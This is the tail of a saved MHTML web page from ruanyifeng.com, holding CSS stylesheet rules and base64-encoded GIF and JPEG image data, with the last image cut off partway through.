body.one-column #content #alpha #comments #comments-open p { margin: 0.4em;=
 }

body.one-column #content #alpha #comments #comments-open textarea { border:=
 1px solid rgb(211, 211, 211); background-color: rgb(245, 244, 223); paddin=
g: 0.5em; width: 90%; }

body.one-column #content #alpha #comments #comments-open input#comment-subm=
it { width: 10em; padding: 0.2em 3em; text-align: center; }

span.hint { color: gray; }

body.one-column #content #alpha #comments #comment-last:target { animation:=
 4s ease 0s 1 normal none running target-fade; }

@keyframes move {=20
  0% { background-color: rgba(0, 0, 0, 0.1); }
  100% { background-color: rgba(0, 0, 0, 0); }
}

@-webkit-keyframes target-fade {=20
  0% { background-color: rgba(0, 0, 0, 0.1); }
  100% { background-color: rgba(0, 0, 0, 0); }
}

body.one-column #content #alpha #comments #comments-open div#wait input { b=
ackground-color: rgb(255, 255, 221); }

body.one-column #content #alpha #comments #comments-open div#wait * { color=
: rgb(43, 43, 43); background-color: rgb(255, 255, 221); }

body.mobile.one-column #content #alpha #comments .comment-footer { display:=
 none; }

@media (max-width: 48rem) {
  body.one-column #content #alpha #comments .comment-footer { display: none=
; }
}

code[class*=3D"language-"], pre[class*=3D"language-"] { color: black; text-=
shadow: white 0px 1px; font-family: monospace, Consolas, Monaco, "Andale Mo=
no"; direction: ltr; text-align: left; white-space: pre; word-spacing: norm=
al; font-size: 1.2em; tab-size: 4; hyphens: none; }

pre[class*=3D"language-"]::selection, pre[class*=3D"language-"] ::selection=
, code[class*=3D"language-"]::selection, code[class*=3D"language-"] ::selec=
tion { text-shadow: none; background: rgb(179, 212, 252); }

@media print {
  code[class*=3D"language-"], pre[class*=3D"language-"] { text-shadow: none=
; }
  #header, .asset-header, #gegz1, #sup-post-2, #cre, #comments { display: n=
one; }
}

pre[class*=3D"language-"] { padding: 0em 0em 0.5em; overflow: auto; }

:not(pre) > code[class*=3D"language-"], pre[class*=3D"language-"] { backgro=
und: rgb(245, 242, 240); }

:not(pre) > code[class*=3D"language-"] { padding: 0.1em; border-radius: 0.3=
em; }

.token.comment, .token.prolog, .token.doctype, .token.cdata { color: slateg=
ray; }

.token.punctuation { color: rgb(153, 153, 153); }

.namespace { opacity: 0.7; }

.token.property, .token.tag, .token.boolean, .token.number { color: rgb(153=
, 0, 85); }

.token.selector, .token.attr-name, .token.string { color: rgb(102, 153, 0);=
 }

.token.operator, .token.entity, .token.url, .language-css .token.string, .s=
tyle .token.string { color: rgb(166, 127, 89); background: rgba(255, 255, 2=
55, 0.5); }

.token.atrule, .token.attr-value, .token.keyword { color: rgb(0, 119, 170);=
 }

.token.regex, .token.important { color: rgb(238, 153, 0); }

.token.important { font-weight: bold; }

.token.entity { cursor: help; }

.token a { color: inherit; }

#comments-open { background: rgb(240, 240, 192); padding: 0em 1em 2em 2em; =
border-radius: 2em; }

#footer { margin: 0px 1em; border-top: 1px solid rgb(211, 211, 211); color:=
 rgb(211, 211, 211); padding-top: 0px; clear: both; line-height: 1.2; }

#footer a { color: gray; }

#footer-content { display: flex; justify-content: flex-end; flex-wrap: wrap=
; }

#footer-content section { width: 300px; margin: 1em 2em 2em 0px; }

#footer-content section h2 { margin-top: 2em; font-size: 1.6em; font-weight=
: 500; color: rgb(0, 0, 0); }

#footer-content section p { color: gray; font-size: 1.4em; }

body.mobile #footer-content section { margin: 1em 1em 0px 0px; }

body.mobile #footer-content section h2 { margin-top: 1em; }

body.mobile #footer-content section h2, body.mobile #footer-content section=
 p { text-align: right; }

@media (max-width: 30rem) {
  #footer-content section { margin: 1em 1em 0px 0px; }
  #footer-content section h2 { margin-top: 1em; }
  #footer-content section h2, #footer-content section p { text-align: right=
; }
}
------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: image/gif
Content-Transfer-Encoding: base64
Content-Location: http://www.ruanyifeng.com/static/themes/theme_scrapbook/images/searchtop.gif

R0lGODlhyQAYANUAAISEhNjY2Nzc3NnZ2dra2tfX193d3YWFhZiYmPv7++Xl5dvb26KiooeHh/Ly
8oiIiLW1tY6Ojvz8/KioqI2NjYuLi7+/v9/f35CQkJSUlKGhoaWlpaurq+rq6unp6eTk5PX19ezs
7Lu7u5KSksjIyLi4uPn5+Z2dne7u7tXV1ejo6Pj4+Ovr67y8vObm5peXl5GRkbGxsfHx8e/v75ub
m97e3tbW1v///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAADJABgAAAb/wE5t
SCwaj8ikcslsOp/QqHRKVQpv2Kx2y+16v+CweEwum8/o9LdmULvf8Lh8Tg8b2vW8fs/vl+9+gYKD
giAtCAAIEDNkBgKEkJGSaQoRABQMiA02YwKPk6ChojcOERUBWRcRDS5inqOwsYElAKhaCgcTrguy
vb5zGRldEwcSYQu8v8rLZrldIgAOxwTM1dZeGAhdHAcJYQTU1+LXMQAXWzIPDGLg4+7MLA0YClke
IwAADxbGXgQD7wB/pWgAYAMEDfgQ4qMRwsuAfwEjxlLBAV/BAStOWHxAostDiSBjofCGRYKFAxYZ
SNMywFbIl7IUvLBY4ROWAC5h6hSVAIJFQgpacO4cOkoADADrsgQoQLQpqAQfTGgpwNSpVVFUr2qd
VIDT1q+DbASwQbas2bNo06pdy7at27dw48qdS7fu2gBBAAA7

------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: image/gif
Content-Transfer-Encoding: base64
Content-Location: http://www.ruanyifeng.com/static/themes/theme_scrapbook/images/top_search_submit.gif

R0lGODlhHQAYAIAAADg4OAAAACH5BAEAAAAALAAAAAAdABgAAAIYhI+py+0Po5y02ouz3rz7D4bi
SJbmiYoFADs=

------MultipartBoundary--ozwB9gKsn1GQUq15ujUxqsg9oVNhZdY27cqRD7Sw1G----
Content-Type: image/jpeg
Content-Transfer-Encoding: base64
Content-Location: https://www.wangbase.com/blogimg/asset/201909/bg2019090501.jpg

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
